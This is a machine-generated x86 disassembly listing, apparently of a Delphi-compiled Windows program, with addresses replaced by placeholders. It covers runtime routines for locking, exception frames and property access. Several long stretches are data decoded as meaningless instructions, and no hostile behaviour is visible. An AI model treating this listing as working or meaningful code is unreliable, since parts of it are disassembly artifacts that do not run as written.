add esp 0xfffffff8
call sub_4034f8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4143af
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4143b6
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_414450
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403220
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414478
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414520
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f68
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_414530
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414606
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4145e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f70
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145f0
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4030bc
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4041a4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407fec
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414630
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41469f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146a6
retn
call sub_4141d4
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405224
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_40f0a8
sub_4146a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414749
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414750
retn
mov eax rw-data
call sub_4141a4
mov eax sub_40eda8
mov [ rw-data ] eax
mov eax sub_40e8f8
mov [ rw-data ] eax
mov edx sub_40e808
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f0a8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413e2c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f3bc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412384
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412aac
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_414754
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] ch
dec eax
add [ ebp + 0x640000ff ] ch
xchg esi eax
dec eax
add [ esi + 0x640000ff ] ch
xchg esi eax
dec eax
add [ edi + 0x640000ff ] ch
xchg esi eax
dec eax
add [ eax + 0x640000ff ] dl
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] dl
xchg esi eax
dec eax
add [ edx + 0x640000ff ] dl
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] dl
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] dl
dec eax
add [ ebp + 0x640000ff ] dl
xchg esi eax
dec eax
add [ esi + 0x640000ff ] dl
xchg esi eax
dec eax
add [ edi + 0x640000ff ] dl
xchg esi eax
dec eax
add [ eax + 0x640000ff ] bl
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] bl
xchg esi eax
dec eax
add [ edx + 0x640000ff ] bl
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] bl
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] bl
dec eax
add [ ebp + 0x640000ff ] bl
xchg esi eax
dec eax
add [ esi + 0x640000ff ] bl
xchg esi eax
dec eax
add [ edi + 0x640000ff ] bl
xchg esi eax
dec eax
add [ eax + 0x640000ff ] al
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] al
xchg esi eax
dec eax
add [ edx + 0x640000ff ] al
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] al
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] al
dec eax
add [ ebp + 0x640000ff ] al
xchg esi eax
dec eax
add [ esi + 0x640000ff ] al
xchg esi eax
dec eax
add [ edi + 0x640000ff ] al
xchg esi eax
dec eax
add [ eax + 0x640000ff ] cl
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] cl
xchg esi eax
dec eax
add [ edx + 0x640000ff ] cl
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] cl
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] cl
dec eax
add [ ebp + 0x640000ff ] cl
xchg esi eax
dec eax
add [ esi + 0x640000ff ] cl
xchg esi eax
dec eax
add [ edi + 0x640000ff ] cl
xchg esi eax
dec eax
add [ eax - 0x1 ] dh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4148a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148a8
retn
sub_4148ec
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414938
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4148e0
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4084c4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4148ec
mov edx [ rw-data ]
mov eax esi
call sub_407fec
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407fec
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4084c4
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_41499c
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414a0c
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414a60
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414ad4
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414b30
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414b84
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4041dc
mov ecx esp
mov edx esi
mov eax ebx
call sub_414b30
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414bcc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414bb8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414c0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414c54
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40476c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414c90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c5b
lea eax [ ebp - 0x4 ]
call sub_404620
retn
sub_414c64
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414b84
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414bcc
pop ebx
retn
dec bl
je r-xdata
call sub_414c0c
jmp r-xdata
pop ebx
retn
sub_414c90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414d56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041c8
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414c64
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d5d
lea eax [ ebp - 0xc ]
call sub_403f40
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_40465c
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414d64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4148e0
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_414dac ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_414edb ]
jmp [ eax * 4 + jump_table_414e48 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_414f70
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414f5c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414fb0
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_414fe8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_415024
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4058e8
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415098
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4150de
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150e5
retn
mov eax rw-data
call sub_403f40
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049c8
sub_4150f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415115
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41511c
retn
sub_415a11
in eax dx
pop ecx
inc ecx
add bl bh
pop ecx
inc ecx
add [ 0x100415a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
adc [ edx + 0x41 ] ebx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x5a8c0040 ] cl
inc ecx
add [ 0x415a ] bl
add [ eax ] al
add [ edx + ebx * 2 + 0x5ac80041 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc00415a ] ch
add [ eax ] al
add [ eax + 0x59 ] dl
inc ecx
add [ ebx + esi - 0x79b3ffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esp + eax * 4 + 0x41 ] bh
add [ ebp + eax * 4 - 0x7a6bffbf ] cl
inc ecx
add [ eax - 0x23ffbe7c ] ch
xchg [ ecx ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
push eax
pop ecx
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bh
mov [ ecx ] al
mov [ ebp - 0x7a6bffbf ] es
inc ecx
add [ eax - 0x5bffbe7c ] ch
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor eax [ eax ]
add al 0x31
inc eax
imul esi [ ebx + 0x74 ] 0xc8746e65
pop edx
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ eax ] ah
xor [ eax ] eax
cmp [ eax - 0x7a73ffbf ] cl
inc ecx
add [ ebp + eax * 4 - 0x7b57ffbf ] dl
inc ecx
add [ eax + ecx * 4 - 0x767bffbf ] ah
inc ecx
add [ ecx + ecx * 4 - 0x7653ffbf ] dh
inc ecx
add [ eax ] al
mov [ ecx ] al
add al [ eax ]
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
mov [ ecx ] al
test [ ecx - 0x764bffbf ] cl
inc ecx
add [ ecx + ecx * 4 - 0x77ffffbf ] ch
inc ecx
add [ edx ] al
add bh bh
movsb [ edi ] [ esi ]
imul esi [ ebx + 0x74 ] 0x8c746e65
pop edx
inc ecx
add ah al
pop ecx
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5b ] ah
inc ecx
add [ esi + 0x5b ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_415c9d
pop esp
inc ecx
add ah bh
pop esp
inc ecx
add [ eax + eax ] bl
add [ eax ] al
lodsb [ esi ]
pop ebx
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] dh
mov al [ ecx ]
mov [ ebp - 0x7a6bffbf ] es
inc ecx
add [ edx + ecx * 4 - 0x714fffbf ] bl
inc ecx
add [ esi + ecx * 4 - 0x7147ffbf ] dh
inc ecx
add [ eax - 0x53ffbe72 ] ch
mov es [ ecx ]
xor al 0x8b
inc ecx
add [ eax + 0x100418b ] dh
add bh bh
jmp [ eax ]
sub_415e84
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
xchg ecx eax
outsb
dec ecx
je r-xdata
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
imul ebp [ esi + 0x67 ] 0x7473694c
cwde
pop edi
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ eax + edx * 4 + 0x41 ] bl
add [ eax ] dl
inc ecx
add [ eax - 0x60 ] cl
inc ecx
add [ eax + 0x41 ] cl
add [ eax - 0x60 ] dl
inc ecx
add [ edx * 4 - 0x5e3bffbf ] ah
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2f40041 ] al
inc ecx
add ah ah
fwait
inc ecx
add [ eax ] dh
mov [ 0xffffffffa3a40041 ] eax
inc ecx
add al cl
popfd
inc ecx
add ah dl
popfd
inc ecx
add [ edi + ecx * 4 - 0x618fffbf ] ah
inc ecx
add [ eax + 0x1c00419e ] dh
lahf
inc ecx
add al dl
xchg esp eax
inc ecx
add [ eax - 0x6927ffbf ] ch
inc ecx
add [ edi + edx * 4 - 0x5f17ffbf ] ch
inc ecx
add al bh
mov al [ 0xffffffff98100041 ]
inc ecx
add [ eax + ebx * 4 + 0x41 ] ah
add [ eax ] dl
cdq
inc ecx
add [ eax + 0x419a ] ch
fwait
inc ecx
add [ ebx + ebx * 4 - 0x61c7ffbf ] dl
inc ecx
add [ esi + ebx * 4 + 0x41 ] dl
add [ ecx + 0x41 ] cl
add [ edi + ebx * 4 - 0x5ca3ffbf ] bl
inc ecx
add [ ebx + 0x41 ] ch
add [ ebx ] cl
push esp
push ebx
je r-xdata
xchg ecx eax
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
hlt
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop esp
pop esi
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
hlt
popad
add [ ebp + 0x60080040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add ah dh
mov [ 0xffffffffa4400041 ] eax
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add al bh
movsb [ edi ] [ esi ]
inc ecx
add [ ebp + 0x41 ] bh
add [ edi ] al
push esp
push ebx
je r-xdata
in al dx
popad
insd
or [ eax + 0x41 ] ah
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add al bh
movsb [ edi ] [ esi ]
inc ecx
add [ eax + ebp * 4 ] cl
inc ecx
add [ 0x6e614854 ] cl
add ah dh
mov [ 0xffffffffa8380041 ] eax
inc ecx
add [ eax + ebp * 4 + 0x41 ] cl
add ah ch
insd
xor [ eax + 0x41 ] ah
add [ edi ] al
pop es
push esp
push ebx
je r-xdata
popad
push ebx
je r-xdata
popad
insd
mov eax eax
adc al 0x61
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
